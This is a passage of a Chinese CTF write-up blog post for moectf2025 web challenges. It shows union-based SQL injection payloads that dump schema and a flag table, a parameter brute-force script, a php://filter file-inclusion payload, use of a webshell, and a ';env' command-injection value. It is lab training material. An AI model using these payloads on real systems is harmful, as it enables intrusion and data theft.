+<h3 id="第八章-天衍真言，星图显圣"><a href="#第八章-天衍真言，星图显圣" class="headerlink" title="第八章 天衍真言，星图显圣"></a><strong>第八章 天衍真言，星图显圣</strong></h3><p>这题考联合注入，以下是我的步骤：</p>
+<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username<span class="operator">=</span><span class="string">&#x27; or 1=1 --+&amp;password=</span></span><br></pre></td></tr></table></figure></div>
+
+<p>回显了Welcome admin，说明注入成功。</p>
+<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username<span class="operator">=</span><span class="string">&#x27; or 1=1 order by 2 --+&amp;password=</span></span><br></pre></td></tr></table></figure></div>
+
+<p>判断列数为两列。（union注入前后列数需相同）</p>
+<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2 --+&amp;password=</span></span><br></pre></td></tr></table></figure></div>
+
+<p>接着判断注入点在1位置上。</p>
+<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select schema_name,2 from information_schema.schemata--+&amp;password=</span></span><br></pre></td></tr></table></figure></div>
+
+<p>查询数据库名：information_schema</p>
+<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select group_concat(table_name),2 from information_schema.tables where table_schema=database()--+&amp;password=</span></span><br></pre></td></tr></table></figure></div>
+
+<p>接着查询表名，并且回显出flag，users两表</p>
+<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select group_concat(column_name),2 from information_schema.columns where table_schema=database()--+&amp;password=</span></span><br></pre></td></tr></table></figure></div>
+
+<p>接着查询字段名，回显value，username，password，三列。</p>
+<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select value,2 from flag--+&amp;password=</span></span><br></pre></td></tr></table></figure></div>
+
+<p>最后查询value即可获得flag</p>
+<h3 id="第十章-天机符阵"><a href="#第十章-天机符阵" class="headerlink" title="第十章 天机符阵"></a>第十章 天机符阵</h3><p>经过大量的搜索查询后得知是XXE漏洞，方法如下</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/08/05/ctfshow-MISC%E5%85%A5%E9%97%A8/E2.png"
+                     
+                ></p>
+<h3 id="第十章-天机符阵-revenge"><a href="#第十章-天机符阵-revenge" class="headerlink" title="第十章 天机符阵_revenge"></a><strong>第十章 天机符阵_revenge</strong></h3><p>同XXE漏洞,方法如下</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/08/05/ctfshow-MISC%E5%85%A5%E9%97%A8/E.png"
+                     
+                ></p>
+<h3 id="第十一章-千机变·破妄之眼"><a href="#第十一章-千机变·破妄之眼" class="headerlink" title="第十一章 千机变·破妄之眼"></a><strong>第十一章 千机变·破妄之眼</strong></h3><p>题目说：<strong>GET</strong> 参数名由<code>m,n,o,p,q</code>这五个字母组成（每个字母出现且仅出现一次），长度正好为 5，虽然不清楚字母的具体顺序，但是他知道<strong>参数名等于参数值</strong>才能进入。</p>
+<p>也就是有5×4×3×2×1&#x3D;120种，让gpt写个脚本爆破一下</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==========================</span></span><br><span class="line"><span class="comment"># 配置区</span></span><br><span class="line"><span class="comment"># ==========================</span></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:45657/&quot;</span>  <span class="comment"># &lt;-- 把这里改成目标 URL</span></span><br><span class="line">letters = <span class="string">&quot;mnopq&quot;</span>             <span class="comment"># 参数字母</span></span><br><span class="line">timeout = <span class="number">5</span>                   <span class="comment"># 请求超时时间（秒）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==========================</span></span><br><span class="line"><span class="comment"># 爆破逻辑</span></span><br><span class="line"><span class="comment"># ==========================</span></span><br><span class="line"><span class="keyword">for</span> perm <span class="keyword">in</span> itertools.permutations(letters):</span><br><span class="line">    param_name = <span class="string">&quot;&quot;</span>.join(perm)</span><br><span class="line">    param_value = param_name</span><br><span class="line">    params = &#123;param_name: param_value&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url, params=params, timeout=timeout)</span><br><span class="line">        content = response.text.lower()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 判断是否成功返回 flag，可以根据实际网页内容调整判断条件</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> content <span class="keyword">or</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] 成功！URL: <span class="subst">&#123;response.url&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] 返回内容:\n<span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[-] 尝试 <span class="subst">&#123;param_name&#125;</span> 失败&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] 请求 <span class="subst">&#123;param_name&#125;</span> 出错: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>最后成功返回URL: <a class="link"   target="_blank" rel="noopener" href="http://127.0.0.1:45657/find.php" >http://127.0.0.1:45657/find.php<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p>此题是一道文件包含漏洞的题。</p>
+<p>接着使用PHP内置伪协议将内容以base64形式输出</p>
+<p>&#x2F;find.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
+<p>最后的到</p>
+<blockquote>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHANCmVjaG8gImZsYWflsLHlnKjov5nkuobvvIznnIvkuI3liLDlkJfvvIzmmK/ogIHlvJ/looPnlYzkuI3lpJ/lkKciOw0KLy9tb2VjdGZ7MzdmNTFlNjAtZmJjOC0zYWM0LTIwNjUtMWNiNDNmOTc1M2JlfQ==</span><br></pre></td></tr></table></figure></div></blockquote>
+<blockquote>
+<?php
+echo "flag就在这了，看不到吗，是老弟境界不够吧";
+//moectf{37f51e60-fbc8-3ac4-2065-1cb43f9753be}</blockquote>
+<h3 id="第十二章-玉魄玄关·破妄"><a href="#第十二章-玉魄玄关·破妄" class="headerlink" title="第十二章 玉魄玄关·破妄"></a><strong>第十二章 玉魄玄关·破妄</strong></h3><p>这题考察蚁剑的使用</p>
+<p>题目给了一个一句话木马，连接后在目录里找一直找不到，后来知道，flag也可能藏在环境变量中。</p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env | grep -i flag</span><br></pre></td></tr></table></figure></div>
+
+<p>最后得到flag</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/08/05/ctfshow-MISC%E5%85%A5%E9%97%A8/%E8%9A%81%E5%89%91.png"
+                     
+                ></p>
+<h3 id="第九章-星墟禁制·天机问路"><a href="#第九章-星墟禁制·天机问路" class="headerlink" title="第九章 星墟禁制·天机问路"></a><strong>第九章 星墟禁制·天机问路</strong></h3><p>这题是命令注入，未对url参数进行过滤和验证。</p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?url=;env</span><br></pre></td></tr></table></figure></div>
+
+<p>flag在环境变量中</p>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> moectf2025wp</li>
+        <li><strong>作者:</strong> xhxbb</li>
+        <li><strong>创建于
+                :</strong> 2025-08-17 21:13:37</li>
+        
+            <li>
+                <strong>更新于
+                    :</strong> 2025-10-12 12:27:24
+            </li>
+        
+        <li>
+            <strong>链接:</strong> https://xhxbb1.github.io/2025/08/17/moectf2025wp/
+        </li>
+        <li>
+            <strong>
+                版权声明:
+            </strong>
+            
+
+            
+                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/ctf/">#ctf</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/08/05/ctfshow-MISC%E5%85%A5%E9%97%A8/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">ctfshow-MISC入门</span>
+						<span class="post-nav-item">下一篇</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        评论
+    </div>
+    
+
+        
+            
+    <div id="giscus-container"></div>
+    <script data-swup-reload-script defer>
+        async function loadGiscus() {
+            const giscusConfig = {
+                'src': 'https://giscus.app/client.js',
+                'data-repo': 'xhxbb1/xhxbb1.github.io',
+                'data-repo-id': 'R_kgDOPQRTkg',
+                'data-category': 'Announcements',
+                'data-category-id': 'DIC_kwDOPQRTks4CtcM8',
+                'data-mapping': 'pathname',
+                'data-strict': '0',
+                'data-reactions-enabled': '1',
+                'data-emit-metadata': '1',
+                'data-theme': 'preferred_color_scheme',
+                'data-lang': 'zh-CN',
+                'data-input-position': 'bottom',
+                'data-loading': 'lazy',
+                'crossorigin': 'anonymous',
+                'async': true
+            }
+            const giscusScript = document.createElement('script');
+            for (const key in giscusConfig) {
+                giscusScript.setAttribute(key, giscusConfig[key]);
+            }
+            document.getElementById('giscus-container').appendChild(giscusScript);
+        }
+        if ('true') {
+            let loadGiscusTimeout = setTimeout(() => {
+                loadGiscus();
+                clearTimeout(loadGiscusTimeout);
+            }, 1000);
+        } else {
+            document.addEventListener('DOMContentLoaded', loadGiscus);
+        }
+    </script>
+
+
+        
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">目录</div>
+		<div class="page-title">moectf2025wp</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AD%BE%E5%88%B0"><span class="nav-text">签到</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%E6%9D%82%E9%A1%B9"><span class="nav-text">安全杂项</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97"><span class="nav-text">Misc入门指北</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pyjail-0"><span class="nav-text">Pyjail 0</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pyjail-1"><span class="nav-text">Pyjail 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ez-LSB"><span class="nav-text">ez_LSB</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ez-%E9%94%9F%E6%96%A4%E6%8B%B7"><span class="nav-text">ez_锟斤拷????</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#weird-photo"><span class="nav-text">weird_photo</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSTV"><span class="nav-text">SSTV</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#encrypted-pdf"><span class="nav-text">encrypted_pdf</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8D%82%E4%BD%8F%E4%B8%80%E5%8F%AA%E8%80%B3"><span class="nav-text">捂住一只耳</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Enchantment"><span class="nav-text">Enchantment</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ez-ssl"><span class="nav-text">ez_ssl</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WebRepo"><span class="nav-text">WebRepo</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ez-png"><span class="nav-text">ez_png</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%87%E9%87%8C%E6%8C%91%E4%B8%80"><span class="nav-text">万里挑一</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Web%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97"><span class="nav-text">Web入门指北</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E7%AB%A0-%E7%A5%9E%E7%A7%98%E7%9A%84%E6%89%8B%E9%95%AF"><span class="nav-text">第一章 神秘的手镯</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E5%88%9D%E8%AF%86%E9%87%91%E6%9B%A6%E7%8E%84%E8%BD%A8"><span class="nav-text">第二章 初识金曦玄轨</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E7%AB%A0-%E9%97%AE%E5%89%91%E7%9F%B3%EF%BC%81%E7%AF%A1%E5%A4%A9%E6%94%B9%E5%91%BD%EF%BC%81"><span class="nav-text">第三章 问剑石！篡天改命！</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%BA%94%E7%AB%A0-%E6%89%93%E4%B8%8A%E9%97%A8%E6%9D%A5%EF%BC%81"><span class="nav-text">第五章 打上门来！</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Moe%E7%AC%91%E4%BC%A0%E4%B9%8B%E7%8C%9C%E7%8C%9C%E7%88%86"><span class="nav-text">Moe笑传之猜猜爆</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%9B%9B%E7%AB%A0%E9%87%91%E6%9B%A6%E7%A0%B4%E7%A6%81%E4%B8%8E%E4%B8%83%E7%BB%9D%E5%82%80%E5%84%A1%E9%98%B5"><span class="nav-text">第四章金曦破禁与七绝傀儡阵</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%85%AD%E7%AB%A0-%E8%97%8F%E7%BB%8F%E7%A6%81%E5%88%B6%EF%BC%9F%E7%8E%84%E6%9C%BA%E5%88%9D%E6%8E%A2%EF%BC%81"><span class="nav-text">第六章 藏经禁制？玄机初探！</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%83%E7%AB%A0-%E7%81%B5%E8%9B%9B%E6%8E%A2%E7%A9%B4%E4%B8%8E%E9%98%B4%E9%98%B3%E5%8F%8C%E7%94%9F%E7%AC%A6"><span class="nav-text">第七章 灵蛛探穴与阴阳双生符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%A4%A9%E8%A1%8D%E7%9C%9F%E8%A8%80%EF%BC%8C%E6%98%9F%E5%9B%BE%E6%98%BE%E5%9C%A3"><span class="nav-text">第八章 天衍真言，星图显圣</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%8D%81%E7%AB%A0-%E5%A4%A9%E6%9C%BA%E7%AC%A6%E9%98%B5"><span class="nav-text">第十章 天机符阵</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%8D%81%E7%AB%A0-%E5%A4%A9%E6%9C%BA%E7%AC%A6%E9%98%B5-revenge"><span class="nav-text">第十章 天机符阵_revenge</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E5%8D%83%E6%9C%BA%E5%8F%98%C2%B7%E7%A0%B4%E5%A6%84%E4%B9%8B%E7%9C%BC"><span class="nav-text">第十一章 千机变·破妄之眼</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%8D%81%E4%BA%8C%E7%AB%A0-%E7%8E%89%E9%AD%84%E7%8E%84%E5%85%B3%C2%B7%E7%A0%B4%E5%A6%84"><span class="nav-text">第十二章 玉魄玄关·破妄</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E6%98%9F%E5%A2%9F%E7%A6%81%E5%88%B6%C2%B7%E5%A4%A9%E6%9C%BA%E9%97%AE%E8%B7%AF"><span class="nav-text">第九章 星墟禁制·天机问路</span></a></li></ol></li></ol></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2025</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">xhxbb</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        共撰写了 3 篇文章
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">访问人数</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">总访问量</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+	<div class="search-pop-overlay">
+	<div class="popup search-popup">
+		<div class="search-header">
+			<span class="search-input-field-pre">
+				<i class="fa-solid fa-keyboard"></i>
+			</span>
+			<div class="search-input-container">
+				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="站内搜索您需要的内容..." spellcheck="false" type="search" class="search-input">
+			</div>
+			<span class="popup-btn-close">
+				<i class="fa-solid fa-times"></i>
+			</span>
+		</div>
+		<div id="search-result">
+			<div id="no-result">
+				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+			</div>
+		</div>
+	</div>
+</div>
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/runtime.js"></script>
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+	<div id="aplayer"></div>
+
+<script src="/js/build/libs/APlayer.min.js"></script>
+
+
+<script src="/js/build/plugins/aplayer.js"></script>
+
+
+	
+</body>
+
+</html>
